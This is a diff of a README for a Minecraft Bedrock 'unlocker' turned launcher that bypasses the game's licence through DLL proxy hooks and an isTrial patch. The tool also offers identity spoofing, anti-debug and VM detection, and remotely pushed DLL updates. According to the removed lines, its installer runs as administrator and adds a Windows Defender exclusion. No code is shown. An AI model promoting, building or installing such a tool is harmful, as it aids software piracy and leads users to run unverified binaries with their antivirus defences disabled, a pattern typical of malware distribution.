@@ -1,126 +1,106 @@
-# Minecraft Unlocker by errortechh
+# ⬡ ERRORLAUNCHER
 
-A powerful tool to unlock Minecraft for Windows (Bedrock Edition) with multi-engine support, SHA256 verification, offline caching, ARM64 support, and 13-language UI.
+> **The ultimate Minecraft Bedrock Edition launcher** — by [errortechh](https://youtube.com/@errortechh)
 
-## 🚀 Quick Install
+![Version](https://img.shields.io/badge/version-3.0.0-10B981?style=flat-square)
+![Platform](https://img.shields.io/badge/platform-Windows-blue?style=flat-square)
+![License](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)
 
+---
+
+## 🎮 Features
+
+### Unlock Engine (3 Methods)
+| Engine | Method | Architecture |
+|--------|--------|--------------|
+| **Engine A** | OnlineFix — winmm proxy + OnlineFix DLL hooks | x64 |
+| **Engine B** | errortechh — vcruntime proxy + isTrial patch | x64 |
+| **Engine C** | winmm.dll — license hook (CoelhoFZ method) | x64 + ARM64 |
+
+### ⚡ Performance Boost
+- **FPS Unlock** — Remove frame rate cap via DX12 hook
+- **GPU Priority** — Set Minecraft to high GPU scheduling
+- **Network Optimizer** — Disable Nagle's algorithm, optimize TCP
+- **Memory Cleanup** — Clear shader cache & temp files
+
+### 🔄 Identity Spoofer
+Spoofs SSID, DID, and CID identifiers. Based on [Kodiak Spoofer](https://github.com/AzOxStOz/spoofer).
+- Removes tracking files and cached data
+- Generates new random UUIDs
+- Auto-launches Minecraft after spoofing
+
+### 📦 Version Controller
+Framework for Minecraft version switching (requires .appx packages).
+
+### 🎨 Pack Loader
+Import `.mcpack`, `.mcaddon`, `.zip` files directly into Minecraft.
+- Auto-detects pack type (resource, behavior, skin)
+- Extracts to the correct folder
+- Browse installed packs
+
+### 🔒 Security
+- SHA256 hash verification on all downloaded DLLs
+- Offline cache with validated binaries
+- Anti-debug, VM detection, RE tool detection
+- HWID-locked 7-day key rotation
+
+### 🌍 13 Languages
+English, Português, Español, Français, 中文, हिन्दी, العربية, Русский, Deutsch, 日本語, 한국어, Bahasa Indonesia, Türkçe
+
+### 🔄 OTA Auto-Updates
+Errorlauncher checks `update.json` on GitHub at startup. When you update the file, all users automatically receive the update — **no reinstallation required**.
+
+---
+
+## 📥 Installation
+
+### One-Click Installer
 1. Download [`mc_installer.exe`](https://github.com/krinjalku/FIXMINECRAFTFILES/releases/latest/download/mc_installer.exe)
-2. Run it (right-click → **Run as Administrator** for best results)
-3. Done! Everything is set up automatically.
+2. Run as administrator
+3. Follow the console prompts
+4. Launch from the **Errorlauncher** desktop shortcut
 
-## 📦 What the Installer Does
+### Manual Install
+1. Download [`errorlauncher.exe`](https://github.com/krinjalku/FIXMINECRAFTFILES/releases/latest/download/errorlauncher.exe)
+2. Place in `%APPDATA%\errorlauncher\`
+3. Create `payloads\engine_a\`, `engine_b\`, `engine_c\` with engine.json configs
+4. Run as administrator
 
-- Downloads `minecraft_unlocker.exe` to `%APPDATA%\minecraft unlocker\`
-- Sets up engine configs for three unlock methods:
-  - **Engine A — OnlineFix Method** — winmm proxy + OnlineFix DLL hooks
-  - **Engine B — errortechh Method** — vcruntime proxy + isTrial patch
-  - **Engine C — winmm.dll Method** — winmm proxy + license hook (x64/ARM64)
-- Creates a **desktop shortcut**
-- Adds Windows Defender exclusion
-- Launches the unlocker when done
+---
 
-## 🎮 Three Unlock Engines
+## 🖥️ UI
 
-| Engine | Method | Architecture | Source |
-|--------|--------|-------------|--------|
-| **Engine A** | OnlineFix winmm proxy | x64 | OnlineFix DLLs |
-| **Engine B** | vcruntime proxy + isTrial patch | x64 | Custom errortechh DLLs |
-| **Engine C** | winmm.dll license hook | x64 + ARM64 | CoelhoFZ method |
+**Liquid Glass Design** with:
+- Dark glassmorphic panels with frosted borders
+- Animated floating particles (dirt, stone, diamond blocks)
+- Ore-colored accents: emerald green, diamond blue, redstone red, amethyst purple
+- Smooth page transitions with sidebar navigation
+- 920×640 window
 
-> **Engine C** auto-detects your game's architecture (x64 vs ARM64) and downloads the correct DLL automatically.
+---
 
-## 🔑 Key System
+## 🔧 For Developers (OTA Updates)
 
-The unlocker uses a key system to verify access:
+To push updates to all users:
 
-1. Open the unlocker — you'll see a **"KEY REQUIRED"** screen with your **HWID**
-2. Click **"Get Key"** — completes the verification process via work.ink
-3. After completing the tasks, you'll receive a **16-character key** locked to your machine
-4. Paste the key in the app and click **"Activate"**
-5. The key is valid for **7 days**, then you'll need a new one
+1. **Update DLL files**: Upload new DLLs to `engine_a/`, `engine_b/`, or `engine_c/` folders
+2. **Update `update.json`**: Change the version number and hashes
+3. **Upload new exe**: Attach new `errorlauncher.exe` to the release
 
-> **Note:** Each key is locked to your machine's HWID (Hardware ID). Keys cannot be shared between different computers.
+Users will automatically receive updates on next launch.
 
-## 🛡️ Security & Integrity
+---
 
-- **SHA256 Hash Verification** — every downloaded DLL is verified against expected hashes before installation
-- **HWID-locked keys** — keys only work on the machine they were generated for
-- **Token-gated access** — key page requires a valid work.ink completion token
-- **Encrypted URLs** — all sensitive URLs are XOR-encrypted in the binary
-- **Anti-debug** — detects debuggers, reverse engineering tools, and VMs
-- **Embedded assets** — background image compiled into the exe, no external downloads needed
+## 📋 Files
 
-## 💾 Offline Cache
+| File | Purpose |
+|------|--------|
+| `errorlauncher.exe` | Main launcher application |
+| `mc_installer.exe` | One-click installer |
+| `update.json` | OTA update manifest |
+| `tested-versions.json` | Version compatibility tracking |
+| `uninstall.bat` | Complete removal script |
 
-After the first successful download, all validated DLL files are cached locally in `%APPDATA%\minecraft unlocker\cache\`. If GitHub is unreachable or a download fails, the unlocker automatically falls back to the cached version — so it works offline too.
+---
 
-## 🏗️ ARM64 Support
-
-Engine C supports **Windows on ARM (ARM64)** natively. The unlocker reads the PE header of `Minecraft.Windows.exe` to detect whether the game is x64 or ARM64, then downloads the correct DLL variant automatically.
-
-## 🌍 Multi-Language Support
-
-The unlocker auto-detects your system language and displays the UI accordingly. Supported languages:
-
-| Language | Code |
-|----------|------|
-| English | `en` |
-| Português | `pt` |
-| Español | `es` |
-| Français | `fr` |
-| 中文 (Chinese) | `zh` |
-| हिन्दी (Hindi) | `hi` |
-| العربية (Arabic) | `ar` |
-| Русский (Russian) | `ru` |
-| Deutsch (German) | `de` |
-| 日本語 (Japanese) | `ja` |
-| 한국어 (Korean) | `ko` |
-| Bahasa Indonesia | `id` |
-| Türkçe (Turkish) | `tr` |
-
-## 🗑️ Uninstall
-
-1. Download [`uninstall.bat`](https://raw.githubusercontent.com/krinjalku/FIXMINECRAFTFILES/main/uninstall.bat) and run it
-2. Or manually delete `%APPDATA%\minecraft unlocker\` and the desktop shortcut
-
-## ✨ Features
-
-- 🎮 **Game detection** — auto-detects Minecraft installation
-- 📥 **Auto-download** — downloads unlock files from GitHub on every use
-- 🔒 **SHA256 verification** — validates file integrity after download
-- 💾 **Offline cache** — works without internet after first install
-- 🏗️ **ARM64 support** — native Windows on ARM compatibility
-- 🌍 **13 languages** — auto-detected from your system locale
-- 🎯 **Game tracker** — shows "PLAYING..." while game is running
-- 🟩 **Grass block icon** — custom Minecraft-themed app icon
-- 📁 **AppData storage** — all data stored in `%APPDATA%\minecraft unlocker\`
-- 🖥️ **Desktop shortcut** — created automatically by installer
-- 🔐 **Key system** — 7-day rotating keys with HWID lock
-- 🛡️ **Anti-tamper** — debugger, VM, and RE tool detection
-- 🔄 **Hot-updatable DLLs** — update engine.json hashes on GitHub to push new DLL versions
-
-## 📁 Repository Structure
-
-```
-engine_a/          OnlineFix method payload files
-engine_b/          errortechh method payload files
-keypage/           Key system web page (GitHub Pages)
-uninstall.bat      Uninstaller
-```
-
-## 🔄 Updating DLLs
-
-To update the DLL files at any time:
-
-1. Upload new DLL files to the appropriate `engine_*` folder
-2. Update the `expected_hashes` in the engine config (installer.cpp)
-3. Rebuild and re-upload `mc_installer.exe` and `minecraft_unlocker.exe`
-4. Users will automatically get the new files on next launch
-
-For Engine C (CoelhoFZ method), updates happen automatically when CoelhoFZ updates their repo — just update the expected hashes.
-
-## 👨‍💻 Credits
-
-Made by **errortechh** — [YouTube](https://youtube.com/@errortechh)
-
-Engine C uses the winmm.dll unlock method by [CoelhoFZ](https://github.com/CoelhoFZ/Minecraft-Bedrock-Free)
+**Made by errortechh** • [YouTube](https://youtube.com/@errortechh)
